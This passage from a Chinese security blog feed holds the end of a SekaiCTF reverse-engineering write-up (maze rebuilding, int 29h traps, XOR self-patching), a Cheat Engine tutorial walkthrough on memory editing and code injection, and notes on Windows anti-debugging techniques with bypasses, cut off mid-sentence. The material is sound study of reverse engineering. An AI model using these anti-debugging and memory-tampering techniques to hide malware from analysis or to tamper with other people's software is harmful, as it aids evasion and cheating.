class="hljs-number">213</span>, <span class="hljs-number">215</span>, <span class="hljs-number">217</span>, <span class="hljs-number">219</span>, <span class="hljs-number">223</span>, <span class="hljs-number">225</span>, <span class="hljs-number">227</span>, <span class="hljs-number">229</span>, <span class="hljs-number">232</span>, <span class="hljs-number">234</span>, <span class="hljs-number">235</span>, <span class="hljs-number">236</span>, <span class="hljs-number">237</span>, <span class="hljs-number">238</span>, <span class="hljs-number">240</span>, <span class="hljs-number">241</span>, <span class="hljs-number">242</span>, <span class="hljs-number">244</span>, <span class="hljs-number">246</span>, <span class="hljs-number">247</span>, <span class="hljs-number">248</span>, <span class="hljs-number">249</span>, <span class="hljs-number">250</span>, <span class="hljs-number">253</span>, <span class="hljs-number">259</span>, <span class="hljs-number">267</span>, <span class="hljs-number">271</span>, <span class="hljs-number">274</span>, <span class="hljs-number">275</span>, <span class="hljs-number">276</span>, <span class="hljs-number">277</span>, <span class="hljs-number">278</span>, <span class="hljs-number">279</span>, <span class="hljs-number">280</span>, <span class="hljs-number">281</span>, <span class="hljs-number">282</span>, <span class="hljs-number">283</span>, <span class="hljs-number">284</span>, <span class="hljs-number">285</span>, <span class="hljs-number">286</span>, <span class="hljs-number">288</span>, <span class="hljs-number">290</span>, <span class="hljs-number">291</span>, <span class="hljs-number">292</span>, <span class="hljs-number">295</span>, <span class="hljs-number">299</span>, <span class="hljs-number">301</span>, <span class="hljs-number">303</span>, <span class="hljs-number">305</span>, <span class="hljs-number">307</span>, <span class="hljs-number">309</span>, <span class="hljs-number">311</span>, <span class="hljs-number">313</span>, <span class="hljs-number">316</span>, <span class="hljs-number">318</span>, <span class="hljs-number">319</span>, <span class="hljs-number">320</span>, <span class="hljs-number">322</span>, <span class="hljs-number">324</span>, <span class="hljs-number">326</span>, <span class="hljs-number">328</span>, <span class="hljs-number">330</span>, <span class="hljs-number">332</span>, <span class="hljs-number">334</span>, <span class="hljs-number">339</span>, <span class="hljs-number">341</span>, <span class="hljs-number">345</span>, <span class="hljs-number">349</span>, <span class="hljs-number">351</span>, <span class="hljs-number">355</span>, <span class="hljs-number">358</span>, <span class="hljs-number">359</span>, <span class="hljs-number">360</span>, <span class="hljs-number">362</span>, <span class="hljs-number">364</span>, <span class="hljs-number">365</span>, <span class="hljs-number">366</span>, <span class="hljs-number">367</span>, <span class="hljs-number">368</span>, <span class="hljs-number">370</span>, <span class="hljs-number">372</span>, <span class="hljs-number">373</span>, <span class="hljs-number">374</span>, <span class="hljs-number">376</span>, <span class="hljs-number">379</span>, <span class="hljs-number">381</span>, <span class="hljs-number">383</span>, <span class="hljs-number">387</span>, <span class="hljs-number">393</span>, <span class="hljs-number">395</span>, <span class="hljs-number">397</span>, <span class="hljs-number">400</span>, <span class="hljs-number">402</span>, <span class="hljs-number">404</span>, <span class="hljs-number">405</span>, <span class="hljs-number">406</span>, <span class="hljs-number">408</span>, <span class="hljs-number">409</span>, <span class="hljs-number">410</span>, <span class="hljs-number">412</span>, <span class="hljs-number">413</span>, <span class="hljs-number">414</span>, <span class="hljs-number">416</span>, <span class="hljs-number">418</span>]<br>    <span class="hljs-keyword">for</span> idx <span class="hljs-keyword">in</span> checked:<br>        x = idx // <span class="hljs-number">21</span><br>        y = idx % <span class="hljs-number">21</span><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-number">0</span> &lt;= x &lt; <span class="hljs-number">21</span> <span class="hljs-keyword">and</span> <span class="hljs-number">0</span> &lt;= y &lt;<span class="hljs-number">21</span>:<br>           maze[x][y] = <span class="hljs-string">&#x27;_&#x27;</span><br><br>    <span class="hljs-keyword">return</span> maze<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">print_maze</span>(<span class="hljs-params">maze</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> maze:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(x))<br><br>maze = build_maze()<br>print_maze(maze)<br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs markdown">111111111111111111111<br>1<span class="hljs-emphasis">_1<span class="hljs-strong">___1__</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">___1</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">1_111_1111111_1_1_1_1</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">1__</span><span class="hljs-strong">____</span><span class="hljs-strong">___1__</span>_</span>1<span class="hljs-emphasis">_1_</span>1<span class="hljs-emphasis">_1</span><br><span class="hljs-emphasis">111_</span>11111<span class="hljs-emphasis">_111_</span>1<span class="hljs-emphasis">_11111</span><br><span class="hljs-emphasis">1<span class="hljs-strong">___1_1_1__</span><span class="hljs-strong">___1__</span><span class="hljs-strong">___1</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">11111_1_11111_111_111</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">1__</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span>_</span>1<span class="hljs-strong">__<span class="hljs-emphasis">_1</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">1_</span>111111111<span class="hljs-emphasis">_1111111_</span>1</span><br><span class="hljs-strong">1<span class="hljs-emphasis">_1_</span>1<span class="hljs-emphasis">_1_</span>__</span><span class="hljs-strong">____</span>1<span class="hljs-emphasis">_1_</span>1<span class="hljs-emphasis">_1</span><br><span class="hljs-emphasis">111_</span>1<span class="hljs-emphasis">_1_</span>1<span class="hljs-emphasis">_111_</span>1<span class="hljs-emphasis">_1_</span>1<span class="hljs-emphasis">_1</span><br><span class="hljs-emphasis">1_</span>1<span class="hljs-strong">____</span><span class="hljs-emphasis">_1<span class="hljs-strong">___1_1__</span><span class="hljs-strong">___1</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">1_11111_1111111_111_1</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">1__</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">___1_1__</span>_</span>1<br>1<span class="hljs-emphasis">_111_</span>1<span class="hljs-emphasis">_1_</span>1<span class="hljs-emphasis">_1_</span>1<span class="hljs-emphasis">_1_</span>1<span class="hljs-emphasis">_1</span><br><span class="hljs-emphasis">1_</span>1<span class="hljs-strong">__<span class="hljs-emphasis">_1_</span>1<span class="hljs-emphasis">_1_</span>1<span class="hljs-emphasis">_1_</span>1<span class="hljs-emphasis">_1_</span>1</span><br><span class="hljs-strong">111<span class="hljs-emphasis">_1_</span>111<span class="hljs-emphasis">_111_</span>1<span class="hljs-emphasis">_111_</span>1</span><br><span class="hljs-strong">1__</span><span class="hljs-emphasis">_1_</span>1<span class="hljs-strong">____</span><span class="hljs-emphasis">_1_</span>1<span class="hljs-strong">__<span class="hljs-emphasis">_1_</span>1</span><br><span class="hljs-strong">1<span class="hljs-emphasis">_1_</span>1<span class="hljs-emphasis">_111_</span>11111<span class="hljs-emphasis">_1_</span>1<span class="hljs-emphasis">_1</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">1_</span>1<span class="hljs-emphasis">_1_</span>__</span>1<span class="hljs-strong">__<span class="hljs-emphasis">_1_</span>__</span>1<span class="hljs-emphasis">_1_</span>1<br>111111111111111111111<br></code></pre></td></tr></table></figure><p>但是目前这个迷宫只有一条路，而且一共走的路径长度也不是 200(50 * 4)</p><p>调试的时候观察到列表中的大部分函数结构如下</p><p><img src="/../images/SeKaiCTF2025/mmm5.png"></p><p>除此之外还有另外的结构</p><p><img src="/../images/SeKaiCTF2025/mmm6.png"></p><p><img src="/../images/SeKaiCTF2025/mmm9.png"></p><p>而最终触发异常退出的地方是是这样的，int 29h，在 Windows 8+ 上会被用作快速失败（等价 RtlFailFast(ecx)），会导致进程立即终止</p><p><img src="/../images/SeKaiCTF2025/mmm7.png"></p><p>x 交叉引用往上找看到</p><p><img src="/../images/SeKaiCTF2025/mmm8.png"></p><p>所以可以知道这种结构下有 xor 的函数就能使 int 29h 被改写成继续执行的指令</p><p>写 ida 脚本找到 6 个这种模式的函数</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">Found <span class="hljs-keyword">XOR</span> pattern <span class="hljs-meta">at</span> <span class="hljs-number">0x14000157E</span><br><span class="hljs-symbol">  Function:</span> <span class="hljs-number">0x140001570</span><br><span class="hljs-symbol">  Instruction:</span> <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">cs</span>:loc_1400014FE, <span class="hljs-number">7Dh</span><br>  Target address: <span class="hljs-number">0x1400014FE</span><br>  <span class="hljs-keyword">XOR</span> value: <span class="hljs-number">0x7D</span><br>--------------------------------------------------<br>Found <span class="hljs-keyword">XOR</span> pattern <span class="hljs-meta">at</span> <span class="hljs-number">0x14000297E</span><br><span class="hljs-symbol">  Function:</span> <span class="hljs-number">0x140002970</span><br><span class="hljs-symbol">  Instruction:</span> <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">cs</span>:loc_1400023DE, <span class="hljs-number">7Dh</span><br>  Target address: <span class="hljs-number">0x1400023DE</span><br>  <span class="hljs-keyword">XOR</span> value: <span class="hljs-number">0x7D</span><br>--------------------------------------------------<br>Found <span class="hljs-keyword">XOR</span> pattern <span class="hljs-meta">at</span> <span class="hljs-number">0x14000365E</span><br><span class="hljs-symbol">  Function:</span> <span class="hljs-number">0x140003650</span><br><span class="hljs-symbol">  Instruction:</span> <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">cs</span>:loc_14000141E, <span class="hljs-number">7Dh</span><br>  Target address: <span class="hljs-number">0x14000141E</span><br>  <span class="hljs-keyword">XOR</span> value: <span class="hljs-number">0x7D</span><br>--------------------------------------------------<br>Found <span class="hljs-keyword">XOR</span> pattern <span class="hljs-meta">at</span> <span class="hljs-number">0x140003F3E</span><br><span class="hljs-symbol">  Function:</span> <span class="hljs-number">0x140003F30</span><br><span class="hljs-symbol">  Instruction:</span> <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">cs</span>:loc_14000271E, <span class="hljs-number">7Dh</span><br>  Target address: <span class="hljs-number">0x14000271E</span><br>  <span class="hljs-keyword">XOR</span> value: <span class="hljs-number">0x7D</span><br>--------------------------------------------------<br>Found <span class="hljs-keyword">XOR</span> pattern <span class="hljs-meta">at</span> <span class="hljs-number">0x14000421E</span><br><span class="hljs-symbol">  Function:</span> <span class="hljs-number">0x140004210</span><br><span class="hljs-symbol">  Instruction:</span> <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">cs</span>:loc_14000211E, <span class="hljs-number">7Dh</span><br>  Target address: <span class="hljs-number">0x14000211E</span><br>  <span class="hljs-keyword">XOR</span> value: <span class="hljs-number">0x7D</span><br>--------------------------------------------------<br>Found <span class="hljs-keyword">XOR</span> pattern <span class="hljs-meta">at</span> <span class="hljs-number">0x14000443E</span><br><span class="hljs-symbol">  Function:</span> <span class="hljs-number">0x140004430</span><br><span class="hljs-symbol">  Instruction:</span> <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">cs</span>:loc_14000179E, <span class="hljs-number">7Dh</span><br>  Target address: <span class="hljs-number">0x14000179E</span><br>  <span class="hljs-keyword">XOR</span> value: <span class="hljs-number">0x7D</span><br></code></pre></td></tr></table></figure><p>分析出这个含有 xor 指令的函数是一个开关一样的功能，走到这里会把目标位置的阻塞消除,但是上面得到的 Target address 还不是真正的目标位置的地址,是函数内的一个标签,如下: </p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs tcl">.text:<span class="hljs-number">0000000140001790</span> sub_140001790   <span class="hljs-keyword">proc</span><span class="hljs-title"> near</span>               ;<span class="hljs-title"> DATA</span> XREF: .rdata:000000014006045E↓o<br>.text:0000000140001790                                         ; .data:0000000140073280↓o<br>.text:0000000140001790<span class="hljs-title">                 push</span> <span class="hljs-title">   rbp</span><br>.text:0000000140001791<span class="hljs-title">                 mov</span> <span class="hljs-title">    rbp,</span> rsp<br>.text:0000000140001794<span class="hljs-title">                 mov</span> <span class="hljs-title">    cs:dwMsg,</span> 5E0D90h<br>.text:000000014000179E<br>.text:000000014000179E<span class="hljs-title"> loc_14000179E:</span>                          ;<span class="hljs-title"> DATA</span> XREF:<span class="hljs-title"> sub_140004430+E↓w</span><br>.text:000000014000179E<span class="hljs-title">                 int</span>     29h             ;<span class="hljs-title"> Win8:</span> RtlFailFast(ecx)<br>.text:000000014000179E<span class="hljs-title"> sub_140001790</span> <span class="hljs-title">  endp</span><br></code></pre></td></tr></table></figure><p>观察后发现 6 个真正的目标地址都是标签地址减去 0xE</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cheat Engine 学习</title>
    <link href="/2025/09/14/CheatEngine/"/>
    <url>/2025/09/14/CheatEngine/</url>
    
    <content type="html"><![CDATA[<p>Cheat Engine 学习使用的简单记录。</p><h2 id="下载与安装"><a href="#下载与安装" class="headerlink" title="下载与安装"></a>下载与安装</h2><p>官方下载网址 <a href="https://www.cheatengine.org/">https://www.cheatengine.org/</a><br>左侧栏 Downloads 里面的 Translations 有中文语言包，解压后扔到 CE 的 language 目录下即可<br>CE 自动下载到 C 盘，没法修改，要改变其安装路径只能下好之后手动剪切粘贴</p><h2 id="基础使用"><a href="#基础使用" class="headerlink" title="基础使用"></a>基础使用</h2><p>跟着它自身提供的教程过了一遍关卡</p><h4 id="步骤-1："><a href="#步骤-1：" class="headerlink" title="步骤 1："></a>步骤 1：</h4><p>在 <code>帮助</code> 里面选择教程，这里以 64 位的为例,双击后根据提示点击 <code>下一步</code></p><p><img src="/../images/CheatEngine/ce1.png"></p><p>点击电脑标识弹出<code>进程列表</code>，选择刚刚打开的教程</p><p><img src="/../images/CheatEngine/ce2.png"></p><h4 id="步骤-2："><a href="#步骤-2：" class="headerlink" title="步骤 2："></a>步骤 2：</h4><p>给出了健康值 100，点击 打我 按钮，健康值就会减少，需要找到这个值在内存中的位置并将其修改为 1000</p><p>由于已经给出了确定的值 100，扫描类型选择 <code>精确数值</code>，再点击 打我 按钮，看到数值发现改变的位置，<strong>双击</strong>选中，添加到下方列表</p><p><img src="/../images/CheatEngine/ce3.png"></p><p><strong>双击</strong>下面列表中的数值，修改为 1000 即可进行下一步</p><h4 id="步骤-3："><a href="#步骤-3：" class="headerlink" title="步骤 3："></a>步骤 3：</h4><p>没告诉具体的初始数值，但是数值会发生变化，比如这里点击 打我 按钮，健康值会减少,所以扫描类型选择 <code>减少的数值</code>(或者”未知的初始值”和”数值减少了…”)，点击首次扫描，等待扫描完成，然后继续点 打我 按钮，点击<code>再次扫描</code>，观察数值变化，锁定正确的地址，接着按照之前的操作修改数值为 5000</p><p><img src="/../images/CheatEngine/ce4.png"></p><h4 id="步骤-4："><a href="#步骤-4：" class="headerlink" title="步骤 4："></a>步骤 4：</h4><p>扫描健康值时数值类型用<code>单浮点</code>，扫描弹药值时数值类型用<code>双浮点</code>,两者都改为 5000</p><p><img src="/../images/CheatEngine/ce5.png"></p><h4 id="步骤-5："><a href="#步骤-5：" class="headerlink" title="步骤 5："></a>步骤 5：</h4><p>按照之前的操作先找到健康值，然后右键点击<code>找出是什么改写了这个地址</code></p><p><img src="/../images/CheatEngine/ce6.png"></p><p>接着点 <em>改变数值</em> 按钮并返回 CE,就可以看到刚刚弹出来的窗口上多出来了一些汇编,点击 <code>替换</code>，再直接点确定（实际上是把这里的汇编替换成了 Nop），然后就会发现那个 改变数值 的按钮已经没用了</p><p><img src="/../images/CheatEngine/ce7.png"></p><h4 id="步骤-6"><a href="#步骤-6" class="headerlink" title="步骤 6:"></a>步骤 6:</h4><p>按照之前的操作找到汇编，然后点击<code>详情信息</code>,可以看到 CE 显示的指针数值</p><p><img src="/../images/CheatEngine/ce8.png"></p><p>返回 CE,点击 <code>新的扫描</code>，勾选 <code>Hex</code>,输入地址，开始首次扫描,搜索到的地址是绿色的，在 CE 中绿色的地址是基址，黑色的地址是动态地址</p><p><img src="/../images/CheatEngine/ce10.png"></p><p>在地址栏指针的显示是<code>P-&gt;</code>这样的，然后修改数值为 5000，并点前面的方框让它激活</p><p><img src="/../images/CheatEngine/ce11.png"></p><p>最后点 <em>改变指针</em> 按钮即可通过</p><h4 id="步骤-7："><a href="#步骤-7：" class="headerlink" title="步骤 7："></a>步骤 7：</h4><p>找到汇编，点击 <code>显示反汇编程序</code>，再在<code>工具</code>里面选择<code>自动汇编</code></p><p><img src="/../images/CheatEngine/ce12.png"></p><p>然后在<code>模板</code>中先后选择 <code>CT表框架代码</code> 和 <code>代码注入</code>(这里的地址不需要做修改，保持默认即可)</p><p><img src="/../images/CheatEngine/ce13.png"></p><p><img src="/../images/CheatEngine/ce14.png"></p><p><img src="/../images/CheatEngine/ce15.png"></p><p>将原来的 <code>sub dword ptr [rsi+000007E0],01</code> 改成 <code>add dword ptr [rsi+000007E0],02</code>,分配到当前的CT表，最后执行</p><p><img src="/../images/CheatEngine/ce16.png"></p><h4 id="步骤8："><a href="#步骤8：" class="headerlink" title="步骤8："></a>步骤8：</h4><p>多重指针<br>按照上文操作看到汇编的详情信息</p><p><img src="/../images/CheatEngine/ce17.png"></p><p>这里的 18 是偏移量，rsi 中存的值就是要找的第一层指针(CE 的提示也是该值)，然后查找这个地址，找到后双击添加到地址栏，右键地址，选择<code>找出是什么访问了这个地址</code>(注意这里是<strong>访问</strong>，不是改写)</p><p>再点击 改变数值 按钮，这里就会出现两条汇编指令，第一条比较没用，看第二条 mov 指令</p><p><img src="/../images/CheatEngine/ce18.png"></p><p>发现这里的地址和上一次一样，这是因为 CE 使用内存硬件断点，这种断点在 指令执行之后 才触发，所以 mov esi, [esi] 已经把 ESI 改掉了,而我们要找的值是改之前的 esi 值</p><p><img src="/../images/CheatEngine/ce19.png"></p><p>点击 新的扫描，把扫描到的地址双击添加到地址栏，右键选择<code>找出是什么访问了这个地址</code>，点击 改变数值 ，查看汇编的详细信息</p><p><img src="/../images/CheatEngine/ce20.png"></p><p>偏移 18，要扫描的地址是 015E82E0</p><p><img src="/../images/CheatEngine/ce21.png"></p><p>偏移 10，要扫描的地址是 015E8260</p><p><img src="/../images/CheatEngine/ce22.png"></p><p>找到绿色的基地址了，手动添加地址，加上前面的四次偏移</p><p><img src="/../images/CheatEngine/ce23.png"></p><p>修改值为 5000 并激活，最后 点 <em>改变指针</em> 按钮即可</p><p>参考文章<br><a href="https://www.cnblogs.com/LyShark/p/10799926.html#_label0">https://www.cnblogs.com/LyShark/p/10799926.html#_label0</a><br><a href="https://blog.csdn.net/qq_24970227/article/details/122718062">https://blog.csdn.net/qq_24970227/article/details/122718062</a></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <categories>
      
      <category>Notes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
      <tag>Cheat Engine</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows 反调试</title>
    <link href="/2025/09/04/Anti-debugging(1)/"/>
    <url>/2025/09/04/Anti-debugging(1)/</url>
    
    <content type="html"><![CDATA[<h3 id="API-反调试"><a href="#API-反调试" class="headerlink" title="API 反调试"></a>API 反调试</h3><p><strong>IsDebuggerPresent</strong><br>一个很简单的函数，用于检测当前进程是否被调试</p><ul><li>函数原型</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">BOOL <span class="hljs-title">IsDebuggerPresent</span><span class="hljs-params">()</span></span>;<br></code></pre></td></tr></table></figure><p>如果当前进程运行在调试器的上下文中，返回值为非零值，否则返回值为零</p><ul><li><p>工作原理<br>每个 Windows 进程中都有一个叫进程环境块（Process Environment Block, PEB）的内核数据结构，PEB 中包含了很多关于进程状态的信息<br>其中有一个很重要的字段叫 BeingDebugged(偏移量 0x02),当调试器附加到一个进程时，操作系统会自动将这个标志位设置为 1，IsDebuggerPresent() 函数内部所作的就是读取当前进程的 PEB 中的 BeingDebugged 字段，并返回其值</p></li><li><p>绕过方法</p><ol><li>在调试器中，直接在 IsDebuggerPresent 函数返回后( ret 指令处)将寄存器(如 RAX&#x2F;EAX) 的值从 1 改为 0</li><li>直接 patch 掉 调用 IsDebuggerPresent 的相关汇编</li><li>修改 PEB：在调试器中手动找到 PEB 的地址，并将其 BeingDebugged 字段置为 0</li></ol></li></ul><p><strong>CheckRemoteDebuggerPresent</strong><br>比 IsDebuggerPresent 更强大一些，不仅可以检测当前进程，还可以检测另一个进程是否在被调试</p><ul><li>函数原型</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">BOOL <span class="hljs-title">CheckRemoteDebuggerPresent</span><span class="hljs-params">(HANDLE hProcess, PBOOL pbDebuggerPresent)</span></span>;<br></code></pre></td></tr></table></figure><p>hProcess 是目标进程的句柄，需要具有 PROCESS_QUERY_INFORMATION 或 PROCESS_QUERY_LIMITED_INFORMATION 访问权限；<br>pbDebuggerPresent 是指向一个布尔值的指针，函数会将检测结果通过这个指针返回</p><ul><li><p>工作原理<br>同样基于 PEB，但它查询的是指定远程进程的 PEB 中 BeingDebugged 标志，除此之外，它底层还会与内层中的调试端口进行交互，当一个调试器附加到进程时，内核会为该进程创建一个调试对象和一个调试端口，CheckRemoteDebuggerPresent 会查询这个端口的存在，即使用户态的 PEB 被修改，内核中的调试端口依然存在</p></li><li><p>绕过方法：</p><ol><li>同上，修改返回值</li><li>用内核调试器隐藏调试端口</li></ol></li></ul><p><strong>ZwSetInformationThread</strong><br>接操纵线程以干扰调试器正常工作，利用了 Windows 操作系统内核提供的原生 API 来隐藏线程，从而剥夺调试器接收和处理该线程事件的能力</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">ZwSetInformationThread</span>(<br>    <span class="hljs-built_in">GetCurrentThread</span>(),        <span class="hljs-comment">// ThreadHandle</span><br>    ThreadHideFromDebugger,    <span class="hljs-comment">// ThreadInformationClass</span><br>    <span class="hljs-literal">NULL</span>,                      <span class="hljs-comment">// ThreadInformation</span><br>    <span class="hljs-number">0</span>                          <span class="hljs-comment">// ThreadInformationLength</span><br>);<br></code></pre></td></tr></table></figure><h3 id="PEB-反调试"><a href="#PEB-反调试" class="headerlink" title="PEB 反调试"></a>PEB 反调试</h3><p><strong>检查 <code>BeingDebugged</code> 字段</strong><br>一个字节，为 1 表示被调试;上文提到的 IsDebuggerPresent() 的内部实现就是检查这个字段</p><p><strong>检查 <code>NtGlobalFlag</code> 字段</strong><br>它检测的是调试器创建进程时所留下的痕迹</p><p>4 字节字段,默认值为 0;在 x86 系统中，通常位于 fs:[30h] + 0x68 的偏移处;当进程由调试器<strong>创建</strong>(而不是先运行再附加)，NtGlobalFlag 字段会被设置为一个特定的值(通常为 0x70)，这个值是多个标志位(FLG_HEAP_ENABLE_TAIL_CHECK &#x3D; 0x10,FLG_HEAP_ENABLE_FREE_CHECK &#x3D; 0x20, FLG_HEAP_VALIDATE_PARAMETERS &#x3D; 0x40)的组合</p><p><strong>检查堆标志 <code>Heap Flags</code></strong><br>与 NtGlobalFlag 相关，调试器创建的进程，其堆内存也会包含一些调试标志</p><p>PEB.ProcessHeap 指向进程的主堆<br>ProcessHeap-&gt;Flags 这个字段包含多个标志，中其中 HEAP_GROWABLE (0x02) 是最基本的、通常都会存在的标志，如果调试器启用了额外的检查，HEAP_TAIL_CHECKING_ENABLED (0x20) 等其他标志会被添加进去<br>ProcessHeap-&gt;ForceFlags，在非调试环境下是 0，但如果调试器想要强制启用某些严格的堆检查，就会在这个字段中设置一个非零值</p><p><strong>检查 <code>ProcessDebugPort</code> 和 <code>ProcessDebugObjectHandle</code></strong><br>ProcessDebugPort：每个进程在内核中都有一个 <code>EPROCESS</code> 结构，当被调试时，其中的 DebugPort 字段会指向一个非空的值(与调试器通讯的端口)，CheckRemoteDebuggerPresent 就是查询这个值<br>ProcessDebugObjectHandle:当一个进程被调试时，系统会为其创建一个调试对象，并在 EPROCESS 中保存其句柄,检查这个句柄是否存在即可判断是否被调试</p><p>当程序处于 3 环(低权限)时，FS:[0] 寄存器指向 TEB(Thread Environment Block, 线程环境块)，通过 FS.Base 能够定位到 TEB，TEB 的 0x30 偏移处存放 PEB 的地址</p><h3 id="OutputDebugString-反调试"><a href="#OutputDebugString-反调试" class="headerlink" title="OutputDebugString 反调试"></a>OutputDebugString 反调试</h3><p><strong>OutputDebugStringA&#x2F;W</strong>:向调试器发送一段字符串，当没有调试器时，OutputDebugString 的调用会失败，因为没有接受者,为了报告这个错误，Windows 内核会设置一个<strong>错误代码</strong>(通过 通过 SetLastError 内部机制)，这个错误码通常是 0x50(ERROR_FILE_NOT_FOUND)，表示找不到调试客户端;当有调试器时，调用成功，因此，内核不会修改最后的错误代码，它保持原样</p><p>这个技术就是通过故意设置一个错误码，然后调用 OutputDebugString，再检查错误码是否被改变，来推断调试器的存在</p><p>典型的流程就是</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">SetLastError</span>(<span class="hljs-number">0x12345678</span>); <span class="hljs-comment">// 故意设置一个错误值</span><br><span class="hljs-built_in">OutputDebugStringA</span>(<span class="hljs-string">&quot;Hello, Debugger?&quot;</span>);<span class="hljs-comment">// 发送调试字符串</span><br>DWORD dwLastError = <span class="hljs-built_in">GetLastError</span>(); <span class="hljs-comment">// // 检索最新的错误代码</span><br></code></pre></td></tr></table></figure><h3 id="TLS-反调试"><a href="#TLS-反调试" class="headerlink" title="TLS 反调试"></a>TLS 反调试</h3><p>TLS (Thread Local Storage)线程本地存储，每个线程独立的一块内存区域，用来存放线程私有的数据，使得一个线程在修改自己的 TLS 数据时不会影响到其他线程的数据<br>TLS 回调(TLS Callback):PE 文件的 TLS 目录中，可以指定一组函数指针,这些函数会在以下时机由系统调用，反调试代码就利用 <code>DLL_PROCESS_ATTACH</code> 这个时机</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">DLL_PROCESS_ATTACH:</span> 当一个DLL被映射到进程的地址空间时，或者进程本身启动时（主线程创建时）<br><br><span class="hljs-symbol">DLL_THREAD_ATTACH:</span> 当一个新线程被创建时<br><br><span class="hljs-symbol">DLL_THREAD_DETACH:</span> 当一个线程结束时<br><br><span class="hljs-symbol">DLL_PROCESS_DETACH:</span> 当DLL从进程的地址空间卸载时，或进程退出时<br></code></pre></td></tr></table></figure><p>由于进程在启动时至少需要创建一个线程来运行，所以 TLS 回调函数的执行先于入口点(main 或 DllMain),而在 TLS 回调函数写入反调试相关代码就能使调试器失效</p><h3 id="异常处理反调试"><a href="#异常处理反调试" class="headerlink" title="异常处理反调试"></a>异常处理反调试</h3><p>调试器通常会捕获异常，通过故意引发异常并检测处理方式来检测调试器<br><strong><code>CloseHandle</code> 异常</strong> &#x3D;&gt; 系统调用触发异常或返回值异常</p><p>CloseHandle 用于关闭一个打开的对象句柄，其函数原型为 <code>BOOL CloseHandle(HANDLE hObject);</code>,如果传入了一个无效的句柄(如 0xDEADBEEF 或 